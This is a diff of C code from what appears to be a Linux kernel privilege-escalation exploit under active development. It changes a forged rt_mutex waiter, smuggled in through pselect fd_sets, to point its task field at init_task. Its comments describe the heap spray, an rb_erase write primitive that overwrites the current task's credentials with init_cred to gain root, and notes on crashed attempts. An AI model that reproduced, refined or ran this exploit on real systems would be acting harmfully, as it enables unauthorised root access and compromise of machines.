@@ -339,14 +339,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
        * (words 0/1 keep the original sole-waiter 0/0; with shift=-2
        * they cannot be placed anyway):
        *   tree_left=0  pi_parent=0  pi_right=0  pi_left=0
-       *   task=fake_task  lock=fake_lock  prio=0  deadline=0
-       * The write lives in the SPRAYED W0 heap waiter (util.c
-       * pselect_custom_write==2): W0.pi = {pc=target-8,
-       * right=REAL init_cred, left=0}. When the unlock's
-       * mark_wakeup_next_waiter dequeues the top waiter W0
-       * (rt_mutex_dequeue_pi(current, W0)), rb_erase Case 1a does
-       *   store-1: *(init_cred+0)=pc  (usage = huge refcount, harmless)
-       *   store-2: *(target-8+8) = init_cred  ->  *task.cred = init_cred
+       *   task=init_task(P0)  lock=fake_lock  prio=0  deadline=0
+       * 09-14 evening hardening: both same-day walks with
+       *   task=fake_task(spray page) died AT pselect entry (fl090020/
+       *   fl091910); every historical SURVIVING 5.10 walk used
+       *   task=init_task P0 (on_rq==1 → ttwu no-op, F27). Spray-page
+       *   task couples the walk's first deref to spray quality
+       *   (KernelSnitch retried 2-3x on both boots; PM page was the
+       *   0xffffff87 high alias). init_task decouples it. lock stays
+       *   fake_lock (spray) — the W0 tree linkage requires it.
        * No rebalance (child-present case). fake_task.pi_waiters NULL.
        */
       struct pselect_waiter_word jc2_words[] = {
@@ -354,7 +355,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
           {5, 0, "pi_left"},
-          {6, (uint64_t)fake_task, "task"},
+          {6, (uint64_t)init_task, "task"},
           {7, (uint64_t)fake_lock, "lock"},
           {8, 0, "prio"},
           {9, 0, "deadline"},
@@ -366,8 +367,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                                 jc2_words[i].name);
       }
       pr_info("stack JC2 carrier: words2-9 zero, task=%016llx "
-              "lock=%016llx prio=0 (write via W0.pi store-2)\n",
-              (unsigned long long)fake_task,
+              "(init_task P0) lock=%016llx prio=0 (write via W0)\n",
+              (unsigned long long)init_task,
               (unsigned long long)fake_lock);
       goto stack_words_done;
     } else {
